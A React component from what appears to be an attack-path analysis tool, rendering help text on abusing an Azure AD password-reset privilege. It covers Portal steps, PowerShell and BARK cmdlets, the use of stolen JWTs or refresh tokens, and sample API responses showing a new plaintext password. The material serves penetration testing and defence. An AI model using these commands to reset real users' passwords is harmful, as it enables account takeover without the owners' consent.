import React from 'react';

const Abuse = () => {
    return (
        <>
            <p>
                There are several options for executing this attack. What will
                work best for you depends on a few factors, including which type
                of credential you possess for the principal with the password
                reset privilege against the target, whether that principal is
                affected by MFA requirements, and whether the principal is affected
                by conditional access policies.
            </p>

            <p>
                The most simple way to execute this attack is to log into the Azure
                Portal at portal.azure.com as the principal with the password reset
                privilege, locate the target user in the Portal, and click &quot;Reset
                Password&quot; on the target user’s overview tab.
            </p>

            <p>
                You can also execute this attack with the official Microsoft
                PowerShell module, using Set-AzureADUserPassword, or PowerZure’s
                Set-AzureUserPassword cmdlet.
            </p>

            <p>
                In some situations, you may only have access to your compromised
                principal’s JWT, and not its password or other credential material.
                For example, you may have stolen a JWT for a service principal from
                an Azure Logic App, or you may have stolen a user’s JWT from Chrome.
            </p>

            <p>
                There are at least two ways to reset a user’s password when using a
                token, depending on the scope of the token and the type of identity
                associated with the token:
            </p>

            <h4>Using an MS Graph-scoped token</h4>

            <p>
                If your token is associated with a Service Principal or User, you may
                set the target’s password to a known value by hitting the MS Graph API.
            </p>

            <p>
                You can use BARK’s Set-AZUserPassword cmdlet to do this. First, we need
                to either already have or create an MS Graph-scoped JWT for the user or
                service principal with the ability to reset the target user’s password:
            </p>
            <pre>
                <code>
                    $MGToken = (Get-MSGraphTokenWithClientCredentials -ClientID &quot;&lt;service principal’s app id&gt;&quot; -ClientSecret &quot;&lt;service principal’s plain text secret&gt;&quot; -TenantName &quot;contoso.onmicrosoft.com&quot;).access_token
                </code>
            </pre>
            <p>
                Then we supply this token, our target user’s ID, and the new password to
                the Set-AZUserPassword cmdlet:
            </p>
            <pre>
                <code>
                    Set-AZUserPassword -Token $MGToken -TargetUserID &quot;d9644c...&quot; -Password &quot;SuperSafePassword12345&quot;
                </code>
            </pre>

            <p>
                If successful, the output will include a &quot;204&quot; status code:
            <pre>
                <code>
                        StatusCode        : 204
                        StatusDescription : NoContent
                        Content           : &#123;&#125;
                        RawContent        : HTTP/1.1 204 NoContent
                                            Cache-Control: no-cache
                                            Strict-Transport-Security: max-age=31536000
                                            request-id: 94243...
                                            client-request-id: 94243...
                                            x-ms…
                        Headers           : &#123;[Cache-Control, System.String[]], [Strict-Transport-Security, System.String[]], [request-id, System.String[]], [client-request-id, System.String[]]…&#125;
                        RawContentLength  : 0
                        RelationLink      : &#123;&#125;
                </code>
            </pre>
            </p>
            <h4>Using an Azure Portal-scoped token</h4>

            <p>
                You may have or be able to acquire an Azure Portal-scoped JWT
                for the user with password reset rights against your target user.
                In this instance, you can reset the user’s password, letting Azure
                generate a new random password for the user instead of you
                supplying one. For this, you can use BARK’s Reset-AZUserPassword
                cmdlet.
            </p>

            <p>
                You may already have the Azure Portal-scoped JWT, or you may acquire
                one through various means. For example, you can use a refresh token
                to acquire a Portal-scoped JWT by using BARK’s
                Get-AzurePortalTokenWithRefreshToken cmdlet:
            </p>
            <pre>
                <code>

                    $PortalToken = Get-AzurePortalTokenWithRefreshToken -RefreshToken $RefreshToken -TenantID &quot;contoso.onmicrosoft.com&quot;

                </code>
            </pre>
            <p>
                Now you can supply the Portal token to BARK’s Reset-AZUserPassword
                cmdlet:
            </p>
            <pre>
                <code>

                        Reset-AZUserPassword -Token $PortalToken.access_token -TargetUserID &quot;targetuser@contoso.onmicrosoft.com&quot;

                </code>
            </pre>

            <p>
                If successful, the response will look like this:
            </p>
                <pre>
                    <code>

                            StatusCode        : 200
                            StatusDescription : OK
                            Content           : &quot;Gafu1918&quot;
                        RawContent        : HTTP/1.1 200 OK
                                                Cache-Control: no-store
                                                Set-Cookie: browserId=d738e8ac-3b7d-4f35-92a8-14635b8a942b; domain=main.iam.ad.ext.azure.com; path=/; secure; HttpOnly; SameSite=None
                                                X-Content-Type-Options: no…
                            Headers           : &#123;[Cache-Control, System.String[]], [Set-Cookie, System.String[]], [X-Content-Type-Options, System.String[]], [X-XSS-Protection, System.String[]]…&#125;
                        Images            : &#123;&#125;
                        InputFields       : &#123;&#125;
                        Links             : &#123;&#125;
                        RawContentLength  : 10
                            RelationLink      : &#123;&#125;
                    </code>
                </pre>
            <p>
                As you can see, the plain-text value of the user’s password is visible in the &quot;Content&quot; parameter value.
            </p>
        </>
    );
};

export default Abuse;
